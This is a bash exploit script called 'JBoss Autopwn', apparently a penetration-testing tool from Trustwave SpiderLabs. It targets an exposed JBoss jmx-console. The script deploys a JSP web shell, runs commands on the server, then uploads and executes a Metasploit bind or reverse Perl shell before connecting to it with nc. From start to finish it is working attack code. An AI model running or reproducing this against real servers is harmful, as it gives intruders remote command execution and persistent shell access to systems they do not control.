#!/bin/bash

#    JBoss Autopwn - A JBoss script for obtaining remote shell access
#    Created by Christian G. Papathanasiou
#    Copyright (C) 2009-2011 Trustwave Holdings, Inc.
# 
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
# 
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
# 
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.


if [ -z $1 ]
then
printf "[!] JBoss *nix autopwn\n[!] Usage: $0 server port\n"
printf "[!] Christian Papathanasiou\n[!] Trustwave SpiderLabs\n"
else

printf "[x] Retrieving cookie\n"
cookie=`printf "GET /jmx-console/ HTTP/1.1\nHost: $1\n\n" | nc $1 $2 | grep -i JSESSION | cut -d: -f2- | cut -d\; -f1`
printf "[x] Now creating BSH script...\n"
A=`sed "s/hostx/$1/g" war/req1.linux | sed "s/portx/$2/g" | sed "s/cookiex/$cookie/g" | nc $1 $2 | grep -i "file:/"`
if [ -z $A ];
then 
printf "[!] Cound not create BSH script..\n"
else 
printf "[x] .war file created successfully in /tmp\n"
fi 
printf "[x] Now deploying .war file:\n"
I=`sed "s/hostx/$1/g" war/req2.linux | sed "s/portx/$2/g" | sed "s/cookiex/$cookie/g" | nc $1 $2 | grep -i "succes"`
if [ -z $I ];
then 
printf "[x] Something went wrong...\n"
else
printf "http://$1:$2/browser/browser/browser.jsp\n" 
browsercookie=`printf "GET /browser/browser/browser.jsp HTTP/1.1\nHost: $1\n\n" | nc $1 $2 |  grep -i jsession | cut -d: -f2 | cut -d\; -f1`
printf "[x] Running as user...:\n"
B=`sed "s/hostx/$1/g" execute/req1 | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | nc $1 $2 | grep -i uid`
printf "$B\n" 
printf "[x] Server uname...:\n"
C=`sed "s/hostx/$1/g" execute/req1 | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed "s/41/49/g" | sed "s/id/uname%20-a/" | nc $1 $2 | grep -v "<" | grep -v ">" | grep -v "{" | grep -v "}" | grep -vi "http" | grep -vi "powered" | grep -vi "content" | grep -vi "date" | grep -vi "server"`
echo $C
printf "[!] Would you like to upload a reverse or a bind shell? "
read shell


if [ $shell == "bind" ]
then
printf "[!] On which port would you like the bindshell to listen on? "
read port
framework3/msfpayload cmd/unix/bind_perl LPORT=$port R >payload 
printf "[x] Uploading bind shell payload..\n"
curl -F "dir=/tmp" -F "sort=1" -F "name=MyFile" -F "filename=@payload" -F "Submit=Upload" http://$1:$2/browser/browser/browser.jsp 1>/dev/null 2>/dev/null
printf "[x] Verifying if upload was successful...\n"
D=`sed "s/hostx/$1/g" execute/req1 | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed "s/41/63/g" | sed "s/id/ls%20-la%20\/tmp\/payload/g" | nc $1 $2 | grep -i payload`
if [ -z $D ]
then
printf "[!] Upload was not successful. You still have a shell though at: /browser/browser/browser.jsp..\n"
else
echo $D
E=`sed "s/hostx/$1/g" execute/req1 | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed "s/41/78/g" | sed "s/id/chmod%20777%20\/tmp\/payload;\/tmp\/payload/g" | nc $1 $2`
printf "[x] You should have a bind shell on $1:$port..\n"
rm -rf payload
printf "[x] Dropping you into a shell...\n"
nc -v $1 $port
fi
fi


if [ $shell = "reverse" ]
then 
myip=`ifconfig -a | grep -i "inet" | cut -d: -f2 | awk '{print $1}' | head -n1`
printf "[!] On which port would you like to accept the reverse shell on? "
read port
framework3/msfpayload cmd/unix/reverse_perl LHOST=$myip LPORT=$port R >payload 
printf "[x] Uploading reverse shell payload..\n"
curl -F "dir=/tmp" -F "sort=1" -F "name=MyFile" -F "filename=@payload" -F "Submit=Upload" http://$1:$2/browser/browser/browser.jsp 1>/dev/null 2>/dev/null
printf "[x] Verifying if upload was successful...\n"
D=`sed "s/hostx/$1/g" execute/req1 | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed "s/41/62/g" | sed "s/id/ls%20-la%20\/tmp\/payload/g" | nc $1 $2 | grep -i payload`

if [ -z $D ]
then
printf "[x] Upload was not successful. You still have a shell though at: /browser/browser/browser.jsp..\n"
else
echo $D
E=`sed "s/hostx/$1/g" execute/req1 | sed "s/portx/$2/g" | sed "s/cookiex/$browsercookie/g" | sed "s/41/78/g" | sed "s/id/chmod%20777%20\/tmp\/payload;\/tmp\/payload/g" | nc $1 $2`
printf "[x] You should have a reverse shell on localhost:$port..\n"
rm -rf payload
fi
fi


fi

fi
